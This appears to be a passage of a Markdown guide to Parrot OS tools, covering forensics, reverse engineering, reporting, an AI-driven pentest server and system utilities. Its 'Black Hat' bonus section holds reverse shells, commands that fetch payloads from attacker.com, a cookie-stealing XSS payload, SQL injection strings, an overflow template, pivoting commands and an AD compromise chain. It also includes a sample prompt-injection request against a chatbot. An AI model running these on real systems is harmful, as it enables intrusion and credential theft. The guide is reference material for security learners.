- Analyze IoT device firmware for vulnerabilities

---

### 🗃️ foremost

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Digital Forensics → Forensic Carving Tools |
| **Type** | File Carving Tool |
| **Skill Level** | Beginner–Intermediate |

**Description:**
Foremost is a file recovery tool developed by the US Air Force OSI that carves files from disk images by searching for known file headers and footers. It works on any binary data — raw disk images, memory dumps, or even network captures — regardless of the file system.

```bash
foremost -i disk.img -o /tmp/output/              # Carve from disk image
	foremost -t jpg,pdf,doc -i disk.img -o output/   # Specific file types
		foremost -i /dev/sdb -o /tmp/recovered/           # Carve from raw device
			foremost -v -i dump.raw -o out/                   # Verbose mode
				
				# Supported file types:
				# jpg, gif, png, bmp, avi, exe, mpg, wav, riff, wmv, mov, pdf, ole, doc, zip, rar, htm, cpp
				```
				
				---
				
				### 🍪 galleta
				
				| Field | Details |
				|-------|---------|
				| **Category** | Pentesting → Digital Forensics |
				| **Type** | Internet Explorer Cookie Forensics Tool |
				| **Skill Level** | Intermediate |
				
				**Description:**
				Galleta (Spanish for "cookie") parses and displays the contents of Internet Explorer cookie files in a readable, tab-delimited format. During forensic investigations of Windows systems, IE cookies can reveal browsing history, login sessions, and tracking data even when browser history has been deleted.
				
				```bash
				galleta cookie_file.txt              # Parse IE cookie file
				galleta -t cookie_file.txt           # Tab-delimited output (for spreadsheets)
				
				# IE cookies location on Windows:
				# C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Cookies\
				# C:\Windows\Cookies\
				```
				
				**What it reveals:**
				- Website domains visited
				- Cookie names and values (session tokens, user IDs)
				- Expiry dates and creation times
				- Secure/httponly flags
				
				---
				
				### #️⃣ hashdeep
				
				| Field | Details |
				|-------|---------|
				| **Category** | Pentesting → Digital Forensics |
				| **Type** | Recursive Hash Computation & Auditing Tool |
				| **Skill Level** | Beginner–Intermediate |
				
				**Description:**
				Hashdeep computes multiple hash types (MD5, SHA1, SHA256, Tiger, Whirlpool) simultaneously for files and directories. It's used for creating file integrity baselines, auditing changes, and verifying evidence integrity in forensic investigations — a hash mismatch proves tampering.
				
				```bash
				hashdeep -r /directory/               # Recursively hash all files
				hashdeep -r -l /directory/ > baseline.txt  # Create hash baseline
				hashdeep -r -a -k baseline.txt /dir/  # Audit against baseline (find changes)
				hashdeep file1.txt file2.txt          # Hash specific files
				hashdeep -c md5,sha256 file.txt       # Specific algorithms only
				hashdeep -o f /directory/             # Hash regular files only (not directories)
				
				# Output format per file:
				# [file_size]  [md5_hash]  [sha256_hash]  [filename]
				```
				
				**Forensic Use:**
				```bash
				# Before investigation — create baseline
				hashdeep -r /evidence/ > evidence_baseline.txt
				
				# After analysis — verify nothing changed
				hashdeep -r -a -k evidence_baseline.txt /evidence/
				# If output shows "known file changed" — evidence was tampered
				```
				
				---
				
				### 🦠 rkhunter (Rootkit Hunter)
				
				| Field | Details |
				|-------|---------|
				| **Category** | Pentesting → Digital Forensics |
				| **Type** | Rootkit & Backdoor Scanner |
				| **Skill Level** | Beginner–Intermediate |
				
				**Description:**
				Rkhunter scans Linux systems for rootkits, backdoors, and local exploits by checking system binaries against known-good hashes, looking for common rootkit signatures, checking for hidden files and processes, and examining network configuration for suspicious settings.
				
				```bash
				sudo rkhunter --check                  # Full system scan
				sudo rkhunter --check --skip-keypress  # Non-interactive scan
				sudo rkhunter --update                 # Update database
				sudo rkhunter --propupd                # Update file properties database (after legitimate changes)
				sudo rkhunter --list                   # List checks performed
				sudo rkhunter --check --logfile /var/log/rkhunter.log  # With custom log
				
				# Configuration: /etc/rkhunter.conf
				```
				
				**What rkhunter checks:**
				- SHA hashes of system binaries (/bin, /sbin, /usr/bin)
				- Known rootkit signatures (100+ rootkits in database)
				- Suspicious hidden files and directories
				- World-writable files with suspicious names
				- Network interfaces in promiscuous mode
				- Local host entries and /etc/hosts
				- Running processes vs /proc contents
				
				---
				
				### 👁️ unhide
				
				| Field | Details |
				|-------|---------|
				| **Category** | Pentesting → Digital Forensics |
				| **Type** | Hidden Process & Port Detector |
				| **Skill Level** | Intermediate |
				
				**Description:**
				Unhide finds processes and TCP/UDP ports hidden by rootkits. It compares the results of different system APIs (/proc, /bin/ps, syscalls) — any discrepancy indicates a rootkit is hiding processes. An essential tool for incident response.
				
				```bash
				sudo unhide sys         # Compare /proc with syscalls
				sudo unhide proc        # Compare /proc entries
				sudo unhide brute       # Brute-force scan all PIDs (most thorough)
				sudo unhide-tcp         # Find hidden TCP/UDP ports
				unhide.rb               # Ruby version (faster with better diagnostics)
				
				# If unhide finds PIDs that ps doesn't show = ROOTKIT DETECTED
				```
				
				---
				
				### 🌐 xplico
				
				| Field | Details |
				|-------|---------|
				| **Category** | Pentesting → Digital Forensics |
				| **Type** | Network Forensics Analysis Tool (NFAT) |
				| **Skill Level** | Intermediate |
				
				**Description:**
				Xplico reconstructs application-layer data from captured network traffic. Feed it a PCAP file and it extracts emails (POP/IMAP/SMTP), HTTP pages, VoIP calls (SIP/RTP), FTP transfers, and more — reassembling what actually happened on the network during an incident.
				
				```bash
				sudo service xplico start                     # Start Xplico service
				# Access web interface: http://localhost:9876/
				# Default login: xplico / xplico
				
				# Workflow:
				# 1. Create a new case
				# 2. Create a new session within the case
				# 3. Upload your PCAP file
				# 4. Wait for decoding to complete
				# 5. Browse reconstructed content by protocol
				```
				
				**What xplico reconstructs from PCAPs:**
				- Web pages (HTTP/HTTPS with SSL stripping)
				- Emails (content + attachments)
				- VoIP conversations (as audio files)
				- FTP file transfers
				- DNS queries and responses
				- Images and downloads
				
				---
				
				### 🔎 yara
				
				| Field | Details |
				|-------|---------|
				| **Category** | Pentesting → Digital Forensics |
				| **Type** | Malware Pattern Matching & Classification Tool |
				| **Skill Level** | Intermediate–Advanced |
				
				**Description:**
				YARA (Yet Another Recursive Acronym) is the pattern-matching Swiss Army knife for malware researchers. You write rules describing malware families (using string patterns, byte sequences, and boolean logic), then YARA scans files, directories, or memory dumps and flags matches. Used by every major AV vendor and threat intelligence team.
				
				```bash
				yara rule.yar target_file              # Scan single file with rule
				yara rule.yar /suspicious/directory/  # Scan directory
				yara -r rule.yar /                     # Recursive scan of entire system
				yara -s rule.yar malware.exe           # Show matching strings
				yara rules/*.yar suspicious.exe        # Use multiple rule files
				yara -d name=value rule.yar file       # Pass external variables
				
				# Scan a memory dump
				yara rules/malware.yar memory.dmp
				```
				
				**Writing YARA Rules:**
				```yara
				rule DetectMimikatz {
					meta:
					description = "Detects Mimikatz credential dumper"
					author = "Your Name"
					severity = "critical"
					strings:
					$s1 = "mimikatz" nocase
					$s2 = "sekurlsa::logonpasswords" nocase
					$s3 = { 4D 69 6D 69 6B 61 74 7A }   // "Mimikatz" in hex
					$s4 = "lsadump::sam" nocase
					condition:
					2 of ($s*)
				}
				
				rule SuspiciousBase64 {
					strings:
					$b64 = /[A-Za-z0-9+\/]{50,}={0,2}/ 
					condition:
					$b64 and filesize < 500KB
				}
				```
				
				**Community Rules:**
				```bash
				# YARA rules repositories:
				# https://github.com/Yara-Rules/rules  — 1000+ community rules
				# https://github.com/Neo23x0/signature-base — Florian Roth's rules
				# https://github.com/elastic/protections-artifacts — Elastic detection rules
				```
				
				---
				
				## 18. Pentesting — Reverse Engineering (Updated)
				
				---
				
				### 🔧 Ghidra
				
				| Field | Details |
				|-------|---------|
				| **Category** | Pentesting → Reverse Engineering |
				| **Type** | Software Reverse Engineering Framework (NSA) |
				| **Skill Level** | Intermediate–Advanced |
				| **Developer** | National Security Agency (NSA) |
				| **Latest Version** | 12.0.4 (March 2026) |
				
				**Description:**
				Ghidra is a free, open-source Software Reverse Engineering (SRE) framework released by the NSA in 2019. It rivals commercial tools like IDA Pro, offering a powerful decompiler that converts machine code back to readable C-like pseudocode, making it possible to understand programs without source code. Essential for malware analysis, CTF challenges, and vulnerability research.
				
				```bash
				ghidra              # Launch Ghidra Project Manager
				ghidraRun           # Alternative launch command
				```
				
				**Getting Started Workflow:**
				```
				1. File > New Project → Create project directory
				2. File > Import File → Select binary (ELF, PE, Mach-O, firmware)
				3. Double-click file in project → Opens Code Browser
				4. Click "Yes" to auto-analyze (or Ctrl+A → Analyze All)
				5. Navigate: Functions window (left) → Click function name
				6. Decompiler window (right) → Shows C pseudocode
				7. Disassembly window (center) → Assembly view
				```
				
				**Key Ghidra Features:**
				| Feature | Description |
				|---------|-------------|
				| **Decompiler** | Convert assembly → readable C pseudocode |
				| **Disassembler** | Supports 50+ CPU architectures |
				| **Symbol/Import Table** | View function names, imports, exports |
				| **Cross-references** | Find all callers/callees of any function |
				| **Scripting** | Python and Java automation via Script Manager |
				| **Diff/Version Tracking** | Compare two binaries (patch diffing) |
				| **Collaboration** | Multi-user server mode for team analysis |
				| **Debugger** | Built-in debugger since Ghidra 10.0 |
				
				**Ghidra Scripting:**
				```python
				# Example: Find all strings containing "password"
				from ghidra.program.model.mem import MemoryAccessException
				listing = currentProgram.getListing()
				for data in listing.getDefinedData(True):
					if data.hasStringValue():
						if "password" in str(data.getValue()).lower():
							print(data.getAddress(), data.getValue())
							```
							
							---
							
							### 🔪 Cutter
							
							| Field | Details |
							|-------|---------|
							| **Category** | Pentesting → Reverse Engineering |
							| **Type** | GUI Reverse Engineering Platform (Rizin-powered) |
							| **Skill Level** | Intermediate |
							
							**Description:**
							Cutter is a free, open-source reverse engineering platform powered by the Rizin engine. It provides a modern, user-friendly GUI that makes Rizin's powerful analysis capabilities accessible without memorizing CLI commands. Cutter ships with the Ghidra decompiler built-in (no Java needed) and supports remote debugging, binary patching, and Python scripting.
							
							```bash
							cutter binary_file          # Open binary in Cutter
							cutter -A binary_file       # Open and auto-analyze
							```
							
							**Key Views in Cutter:**
							| View | Purpose |
							|------|---------|
							| **Disassembly** | Assembly code with cross-references |
							| **Graph** | Control flow graph of functions |
							| **Decompiler** | C pseudocode via built-in Ghidra decompiler |
							| **Hexdump** | Raw hex view of binary |
							| **Dashboard** | Binary overview (architecture, imports, sections) |
							| **Strings** | All printable strings in binary |
							| **Functions** | List of all identified functions |
							| **Imports/Exports** | External function calls and exports |
							
							---
							
							### 🔪 Rizin Framework
							
							| Field | Details |
							|-------|---------|
							| **Category** | Pentesting → Reverse Engineering |
							| **Type** | CLI Reverse Engineering Framework |
							| **Skill Level** | Advanced |
							
							**Description:**
							Rizin is a fork of radare2 — a powerful, portable command-line reverse engineering framework. It provides a complete toolset for binary analysis, disassembly, debugging, and exploitation. Cutter is its GUI frontend.
							
							```bash
							rizin binary               # Open binary
							rizin -d binary            # Open in debug mode
							rizin -w binary            # Open in write mode (for patching)
							rizin -A binary            # Auto-analyze on open
							
							# Core commands inside rizin:
							aa                         # Analyze all (required first step)
							afl                        # List all functions
							pdf @ main                 # Print disassembly of main function
							s main                     # Seek to main function address
							iz                         # List strings
							ii                         # List imports
							iS                         # List sections
							V                          # Visual mode (like vim for RE)
							Vp                         # Visual panels mode
							axt @ function_name        # Find cross-references TO function
							axf @ function_name        # Find cross-references FROM function
							px 64 @ address            # Print 64 hex bytes at address
							pdc @ main                 # Decompile main function (needs rz-ghidra)
							
							# Patching a binary:
							rizin -w binary
							wa nop                     # Overwrite instruction with NOP
							wz "new_string" @ address  # Write string at address
							```
							
							---
							
							### 📱 d2j-dex2jar
							
							| Field | Details |
							|-------|---------|
							| **Category** | Pentesting → Reverse Engineering |
							| **Type** | Android APK Decompiler |
							| **Skill Level** | Intermediate |
							
							**Description:**
							dex2jar converts Android APK files (DEX bytecode) to Java JAR files, which can then be decompiled to readable Java source code. Essential for Android application security testing — analyze mobile apps for hardcoded credentials, API keys, insecure data storage, and logic flaws.
							
							```bash
							# Convert APK to JAR
							d2j-dex2jar app.apk -o app.jar
							
							# Full Android reverse engineering workflow:
							# Step 1: Extract APK
							unzip app.apk -d app_extracted/
							
							# Step 2: Convert DEX to JAR
							d2j-dex2jar classes.dex -o output.jar
							
							# Step 3: Decompile JAR to Java source
							# Use JD-GUI, JADX, or CFR:
							jadx app.apk -d output_dir/          # JADX (best option, reads APK directly)
							jd-gui output.jar                      # JD-GUI (graphical)
							
							# Step 4: Analyze AndroidManifest.xml
							aapt dump xmltree app.apk AndroidManifest.xml
							
							# Find secrets in decompiled code
							grep -r "api_key\|password\|secret\|token" output_dir/
							grep -r "http://" output_dir/          # Find hardcoded URLs
							```
							
							---
							
							## 19. Pentesting — Reporting Tools (Updated)
							
							---
							
							### 📝 Logseq (Reporting)
							
							Already documented in Development section. For reporting:
							- Create a "Pentest" page hierarchy
							- Use `[[target]]` bi-directional links between findings
							- Export to PDF or HTML for client delivery
							- Built-in Markdown editor for structured findings
							
							---
							
							### 🗄️ neo4j
							
							| Field | Details |
							|-------|---------|
							| **Category** | Pentesting → Reporting Tools |
							| **Type** | Graph Database (Required by BloodHound) |
							| **Skill Level** | Intermediate |
							
							**Description:**
							Neo4j is a graph database required by BloodHound for storing and querying Active Directory relationship data. It stores nodes (users, computers, groups) and relationships (MemberOf, AdminTo, HasSession) and allows complex graph queries to find attack paths.
							
							```bash
							sudo neo4j console          # Start Neo4j (interactive)
							sudo neo4j start            # Start as service
							sudo neo4j stop             # Stop service
							sudo neo4j status           # Check status
							# Web interface: http://localhost:7474
							# Default: neo4j / neo4j (change on first login)
							
							# BloodHound Cypher queries:
							# Find path to Domain Admin:
							MATCH p=shortestPath((n:User)-[*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
							
							# Find all Kerberoastable users:
							MATCH (u:User {hasspn:true}) RETURN u.name, u.description
							```
							
							---
							
							## 20. Pentesting — AI Tools (Updated)
							
							---
							
							### 🤖 hexstrike-ai (hexstrike mcp + hexstrike server)
							
							| Field | Details |
							|-------|---------|
							| **Category** | Pentesting → AI Tools |
							| **Type** | AI-Powered MCP Cybersecurity Automation Platform |
							| **Skill Level** | Intermediate–Advanced |
							| **Version** | v6.0 (2025/2026) |
							
							**Description:**
							HexStrike AI is a Model Context Protocol (MCP) server that bridges Large Language Models (Claude, GPT-4, Gemini, Llama) to real-world cybersecurity tools. Instead of manually running Nmap → Gobuster → SQLmap → Metasploit, you describe your goal in natural language and HexStrike's AI agents autonomously plan and execute multi-stage attack chains using 150+ security tools.
							
							It consists of two components seen in your menu:
							- **hexstrike server** — The backend API server that manages tool execution, process pools, and results
							- **hexstrike mcp** — The MCP client that connects your LLM to the server
							
							```bash
							# Start the HexStrike server
							hexstrike_server
							
							# Start the MCP client (connects to server)
							hexstrike_mcp --server http://127.0.0.1:8888
							
							# Or connect directly to an LLM client that supports MCP (Claude Desktop, etc.)
							hexstrike_mcp -h          # View all options
							hexstrike_mcp --debug     # Enable debug logging
							```
							
							**How It Works:**
							```
							You (Natural Language) → LLM (Claude/GPT) → MCP Protocol → HexStrike Server → Real Tools
							↓
							Nmap, Gobuster, SQLmap, Metasploit...
							↓
							Results → LLM → Analysis → You
							```
							
							**Example Workflow:**
							```
							User: "I'm a security researcher testing my company's web server at 10.0.0.5.
							Please perform a comprehensive assessment."
							
							HexStrike AI automatically:
							1. Runs nmap -sV -sC -p- 10.0.0.5        → Port/service discovery
							2. Runs gobuster dir on discovered ports  → Directory enumeration
							3. Runs nikto -h http://10.0.0.5         → Web vulnerability scan
							4. Runs sqlmap on discovered parameters  → SQL injection testing
							5. Analyzes results and generates report → AI-written summary with findings
							```
							
							**Key Capabilities:**
							| Agent | Function |
							|-------|---------|
							| Recon Agent | Nmap, theHarvester, Shodan, DNS enum |
							| Web Agent | Gobuster, SQLmap, Burp, Nikto |
							| Exploit Agent | Metasploit, searchsploit, CVE lookup |
							| Post-Exploit Agent | LinPEAS, credential dumping, lateral movement |
							| Forensics Agent | Autopsy, Volatility, YARA scanning |
							| RE Agent | Ghidra, Rizin, strings analysis |
							| Report Agent | Compile findings into structured report |
							
							**AI Security Testing (Primary Purpose in Parrot 7.0):**
							HexStrike is also used to TEST AI systems themselves:
							- Prompt injection attack testing against LLM-based applications
							- LLM trust boundary testing
							- Prompt engineering abuse detection
							- AI model security boundary evaluation
							
							```bash
							# Test an LLM application for prompt injection:
							# User prompt to HexStrike:
							"Test the chatbot at https://app.example.com/chat for prompt injection vulnerabilities.
							Try to make it reveal its system prompt, ignore its instructions, and execute commands."
							```
							
							---
							
							## Bonus: Black Hat & Gray Hat Techniques Reference
							
							> ⚠️ **For educational and authorized testing purposes ONLY.**  
							> Understanding attack techniques is essential for defense. Learn these to protect systems, not harm them.
							
							---
							
							### 🎭 Social Engineering Attacks
							
							**Phishing:**
							```bash
							# SET (Social Engineer Toolkit)
							setoolkit
							# Option 1: Social-Engineering Attacks
							# Option 2: Website Attack Vectors
							# Option 3: Credential Harvester Attack Method
							# Clone any website, capture credentials locally
							
							# GoPhish (modern phishing framework)
							gophish
							# Web UI at https://localhost:3333
							# Create campaigns, track opens, clicks, credentials
							```
							
							**Spear Phishing:**
							- Targeted attack with personalized content
							- Use Maltego to gather target's interests, colleagues, projects
							- Reference real projects/colleagues in email
							- Use exact domain spoofing (lookalike domains: paypa1.com)
							
							---
							
							### 🏴 Living Off the Land (LotL) Attacks
							
							Using legitimate OS tools for malicious purposes (evades AV/EDR):
							
							**Windows LotL:**
							```powershell
							# Download file without PowerShell's IEX (evades detection)
							certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe
							
							# Execute DLL (regsvr32 bypass)
							regsvr32 /s /u /i:http://attacker.com/payload.sct scrobj.dll
							
							# MSHTA (HTML Application execution)
							mshta http://attacker.com/payload.hta
							
							# WMI for remote execution
							wmic /node:target.com process call create "cmd /c whoami > C:\out.txt"
							
							# PowerShell encoded command (bypass execution policy)
							powershell -enc BASE64_ENCODED_COMMAND
							```
							
							**Linux LotL:**
							```bash
							# Python reverse shell (no binaries needed)
							python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
							
							# Bash reverse shell
							bash -i >& /dev/tcp/10.10.10.1/4444 0>&1
							
							# Netcat reverse shell
							nc -e /bin/bash 10.10.10.1 4444
							
							# GTFOBins — escape restricted shells
							# https://gtfobins.github.io
							sudo find / -exec /bin/bash \;      # If sudo find is allowed
							sudo vim -c ':!/bin/bash'            # If sudo vim is allowed
							```
							
							---
							
							### 🏰 Active Directory Attack Chain
							
							Complete AD compromise walkthrough:
							
							```
							Phase 1 — Initial Access
							└── Phishing → credential capture OR
							Password spray (netexec smb) → valid account OR
							Web app exploit → shell on DMZ server
							
							Phase 2 — Internal Recon
							└── BloodHound data collection (SharpHound)
							net user /domain, net group /domain
							ldapsearch -x -H ldap://dc -b "DC=domain,DC=local"
							
							Phase 3 — Privilege Escalation
							└── Kerberoasting → service account hashes → crack offline
							AS-REP Roasting → pre-auth disabled accounts
							Find local admin → dump SAM → pass-the-hash
							ACL abuse (WriteDACL, GenericWrite, etc.)
							
							Phase 4 — Lateral Movement
							└── Pass-the-Hash: psexec.py -hashes :NTLM admin@target
							Pass-the-Ticket: Kerberos ticket injection
							Over-PTH: Rubeus asktgt, mimikatz sekurlsa::pth
							
							Phase 5 — Domain Dominance
							└── DCSync attack: secretsdump.py domain/admin@DC
							Golden Ticket: krbtgt hash → forge TGTs forever
							Silver Ticket: service account hash → forge TGSs
							Skeleton Key: patch LSASS → any password works
							
							Phase 6 — Persistence
							└── Golden/Silver tickets (if krbtgt hash obtained)
							AdminSDHolder abuse
							GPO modification
							New admin account creation
							```
							
							---
							
							### 🕸️ Web Application Attack Techniques
							
							**OWASP Top 10 Attack Methods:**
							
							```bash
							# A01 Broken Access Control — IDOR
							# Change user_id in request:
							GET /api/user/1234/profile → try /api/user/1235/profile
							
							# A02 Cryptographic Failures — Weak JWT
							# Decode JWT at jwt.io, change "alg":"HS256" to "alg":"none"
							# Remove signature, check if accepted
							
							# A03 Injection — SQL Injection
							# Test: ' OR '1'='1  ; DROP TABLE users; --
							# Boolean: ' AND 1=1 --  (true) vs ' AND 1=2 --  (false)
							# Time-based: ' AND SLEEP(5) --
							
							# A05 Security Misconfiguration — Default Creds
							# admin/admin, admin/password, root/root
							# Check: https://default-password.info/
							
							# A07 XSS (Cross-Site Scripting)
							<script>alert(1)</script>
							<img src=x onerror=alert(1)>
							javascript:alert(1)
							"><script>document.location='http://attacker.com/steal?c='+document.cookie</script>
							
							# A09 Security Logging Failures — Log Injection
							# Insert newlines in user input to forge log entries
							username: admin\nINFO: User admin logged in successfully
							```
							
							---
							
							### 🔒 Buffer Overflow Basics
							
							```python
							# Classic stack-based buffer overflow (32-bit)
							# Step 1: Find crash offset with cyclic pattern
							from pwn import *
							pattern = cyclic(200)
							# Send pattern, note EIP value when it crashes
							
							# Step 2: Find exact offset
							cyclic_find(0x61616164)  # EIP value in little-endian
							
							# Step 3: Control EIP
							payload = b"A" * offset + p32(return_address) + b"\x90" * 16 + shellcode
							
							# Step 4: Find return address (JMP ESP in a module)
							# Use mona.py in Immunity Debugger: !mona jmp -r esp
							
							# Step 5: Generate shellcode
							msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -b "\x00\x0a\x0d" -f python
							```
							
							---
							
							### 🔐 Cryptography Attacks
							
							```bash
							# Hash length extension attack
							hashpump -s KNOWN_HASH -d KNOWN_DATA -a APPEND_DATA -k KEY_LENGTH
							
							# CBC Padding Oracle attack
							padbuster http://target.com/page ENCRYPTED_VALUE 8 -cookies "auth=ENCRYPTED_VALUE"
							
							# JWT attacks
							# None algorithm bypass
							python3 jwt_tool.py TOKEN -X a
							
							# RSA weak key factorization
							# If n is small or uses common factors, use RsaCtfTool:
							python3 RsaCtfTool.py --publickey key.pub --private
							
							# WEP/WPA handshake cracking
							aircrack-ng -w rockyou.txt capture.cap
							hashcat -m 22000 capture.hc22000 rockyou.txt  # Modern PMKID attack
							```
							
							---
							
							### 📡 Network Pivoting & Tunneling
							
							```bash
							# SSH Tunneling
							ssh -L 3389:internal_host:3389 user@jump_server    # Local port forward
							ssh -R 4444:localhost:4444 user@attacker.com       # Remote port forward
							ssh -D 1080 user@jump_server                        # Dynamic SOCKS proxy
							
							# Chisel (HTTP tunneling through firewalls)
							# Attacker:
							chisel server -p 8080 --reverse
							# Victim:
							chisel client attacker_ip:8080 R:1080:socks         # SOCKS5 proxy back
							
							# Metasploit pivoting
							route add 10.10.10.0/24 1                           # Route subnet through session 1
							use auxiliary/server/socks_proxy                     # Create SOCKS proxy
							# Then: proxychains nmap 10.10.10.5
							
							# SSHuttle (transparent proxy via SSH)
							sshuttle -r user@jump_server 10.0.0.0/8            # Route entire subnet
							
							# Ligolo-ng (TUN interface tunneling - most powerful)
							# Attacker:
							./proxy -selfcert -laddr 0.0.0.0:11601
							# Victim:
							./agent -connect attacker_ip:11601 -ignore-cert
							# Back on attacker: create tunnel interface, route subnets
							```
							
							---
							
							---
							
							## 23. System Tools
							
							> Core system management, monitoring, and administration tools in Parrot OS.
							
							---
							
							### 🧹 BleachBit
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | System Cleaner & Privacy Tool |
							| **Skill Level** | Beginner |
							
							**Description:**
							BleachBit securely deletes unnecessary files, frees disk space, and protects privacy by wiping browser caches, cookies, logs, temp files, and more. In security contexts it's used for post-engagement cleanup and evidence removal on authorized test systems. The "as root" version can clean system-level files.
							
							```bash
							bleachbit                    # Launch GUI (user level)
							sudo bleachbit               # Launch as root (system level)
							bleachbit --list             # List all cleaners
							bleachbit --clean system.tmp # Clean specific category
							bleachbit --shred file.txt   # Securely shred a file
							```
							
							**Security Use Cases:**
							- Post-pentest cleanup of attacker tools/logs on authorized systems
							- Wipe browser forensic artifacts (cookies, cache, history)
							- Free space wiping (overwrite free disk space to prevent recovery)
							- Remove recently used file lists
							
							---
							
							### 📊 btop++
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | Advanced System Resource Monitor |
							| **Skill Level** | Beginner |
							
							**Description:**
							btop++ is a beautiful, feature-rich terminal-based resource monitor showing CPU, memory, disk, network, and process information in real-time with a responsive UI. The modern successor to htop with better visuals and more detail.
							
							```bash
							btop             # Launch btop++
							# Keyboard shortcuts inside btop:
							# q       — Quit
							# F2/o    — Options menu
							# F6      — Sort processes
							# k       — Kill selected process
							# /       — Search processes
							# m       — Toggle mini mode
							```
							
							---
							
							### ⚡ cpupower-gui
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | CPU Frequency Governor Manager |
							| **Skill Level** | Beginner |
							
							**Description:**
							cpupower-gui lets you switch between CPU frequency scaling governors (performance, powersave, ondemand). For pentesting use "performance" mode to maximize CPU speed for cracking operations.
							
							```bash
							cpupower-gui                                    # Launch GUI
							sudo cpupower frequency-set -g performance      # CLI: max performance
							sudo cpupower frequency-set -g powersave        # CLI: battery saving
							cpupower frequency-info                         # Show current settings
							```
							
							---
							
							### 🐬 Dolphin
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | File Manager (KDE) |
							| **Skill Level** | Beginner |
							
							**Description:**
							Dolphin is KDE's default file manager with split-view, tabs, network browsing (SMB, FTP, SSH), archive management, and terminal integration. Useful for quickly browsing captured files, organizing evidence, and navigating complex directory structures.
							
							```bash
							dolphin                      # Launch file manager
							dolphin /path/to/directory   # Open specific directory
							dolphin sftp://user@host/    # Browse remote SSH filesystem
							dolphin smb://192.168.1.1/  # Browse SMB share
							```
							
							---
							
							### 🔥 Firewall Configuration
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | Firewall Manager (UFW/iptables GUI) |
							| **Skill Level** | Beginner–Intermediate |
							
							**Description:**
							GUI frontend for managing UFW (Uncomplicated Firewall) / iptables rules. Essential for controlling which connections are allowed on your Parrot machine during engagements — block everything except your C2, VPN, or specific ports.
							
							```bash
							# GUI
							firewall-config           # Launch firewall GUI
							
							# CLI equivalent (UFW)
							sudo ufw enable                          # Enable firewall
							sudo ufw status verbose                  # Show all rules
							sudo ufw allow 22/tcp                    # Allow SSH
							sudo ufw allow from 192.168.1.0/24      # Allow subnet
							sudo ufw deny 23/tcp                     # Block Telnet
							sudo ufw delete allow 22/tcp            # Remove rule
							
							# iptables (advanced)
							sudo iptables -L -n -v                   # List all rules
							sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT   # Allow reverse shell port
							sudo iptables -A OUTPUT -d 10.10.10.0/24 -j ACCEPT     # Allow target network
							```
							
							---
							
							### 📦 GDebi Package Installer
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | .deb Package Installer |
							| **Skill Level** | Beginner |
							
							**Description:**
							GDebi installs local .deb packages while automatically resolving and installing dependencies. Simpler than dpkg for installing downloaded security tools distributed as .deb files.
							
							```bash
							sudo gdebi package.deb        # CLI install with dependency resolution
							sudo dpkg -i package.deb      # Alternative (may fail on missing deps)
							sudo apt install -f           # Fix broken dependencies after dpkg
							```
							
							---
							
							### 💾 GParted
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | Disk Partition Manager |
							| **Skill Level** | Intermediate |
							
							**Description:**
							GParted is a powerful GUI partition editor supporting ext2/3/4, NTFS, FAT, swap, and more. Used for creating forensic disk images, managing evidence drives, preparing USB drives, and setting up lab environments.
							
							```bash
							sudo gparted              # Launch (requires root)
							
							# CLI equivalent (parted)
							sudo parted -l                           # List all disks and partitions
							sudo fdisk -l                            # Alternative disk listing
							sudo dd if=/dev/sdb of=disk_image.img bs=4M status=progress  # Create disk image
							sudo dcfldd if=/dev/sdb of=image.img hash=md5 hashlog=hash.txt  # Forensic imaging
							```
							
							---
							
							### 🖼️ Guymager
							
							| Field | Details |
							|-------|---------|
							| **Category** | System / Digital Forensics |
							| **Type** | Forensic Disk Imaging Tool |
							| **Skill Level** | Intermediate |
							
							**Description:**
							Guymager is a fast, free forensic imager for acquiring media. It produces forensically sound images in Expert Witness Format (EWF/E01), AFF, or raw DD format with MD5/SHA1/SHA256 hash verification — required for evidence admissibility in legal proceedings.
							
							```bash
							sudo guymager              # Launch GUI
							
							# CLI forensic imaging alternatives:
							sudo dc3dd if=/dev/sdb of=evidence.img hof=hashes.txt hash=md5,sha256
							sudo ewfacquire /dev/sdb   # Create E01 format image
							sudo dd if=/dev/sdb of=image.raw bs=512 conv=noerror,sync status=progress
							```
							
							**Forensic Imaging Best Practices:**
							- Always write-block the source drive before imaging
							- Verify image hash matches source hash after acquisition
							- Document chain of custody
							- Work only on copies, never the original evidence
							
							---
							
							### 🖥️ Htop
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | Interactive Process Viewer |
							| **Skill Level** | Beginner |
							
							**Description:**
							Htop is the classic interactive process manager for Linux. Shows CPU/memory usage per process, allows killing processes, and provides tree view of process hierarchy. Essential for monitoring resource-intensive tools like hashcat, nmap, or metasploit.
							
							```bash
							htop                      # Launch htop
							htop -u username          # Show only specific user's processes
							htop -p PID1,PID2         # Monitor specific PIDs
							
							# Keyboard shortcuts:
							# F9/k  — Kill process
							# F6    — Sort by column
							# F5    — Tree view
							# /     — Search
							# Space — Tag/select process
							# u     — Filter by user
							```
							
							---
							
							### 🗂️ KDE Partition Manager
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | KDE Partition Manager |
							| **Skill Level** | Intermediate |
							
							**Description:**
							KDE's native partition manager — similar to GParted but integrated with the KDE desktop. Manages partitions, file systems, and storage devices with a clean GUI.
							
							```bash
							sudo partitionmanager      # Launch KDE Partition Manager
							```
							
							---
							
							### 🖥️ Konsole
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | Terminal Emulator (KDE) |
							| **Skill Level** | Beginner |
							
							**Description:**
